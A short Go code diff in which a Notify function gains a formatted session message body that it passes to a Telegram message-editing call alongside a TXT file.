@@ -176,7 +176,8 @@ func Notify(session Session) {
 				fmt.Println("Error creating TXT file for update:", err)
 				return
 			}
-			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath)
+			msg_body := formatSessionMessage(session)
+			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msg_body)
 			if err != nil {
 				fmt.Printf("Error editing message: %v\n", err)
 			}
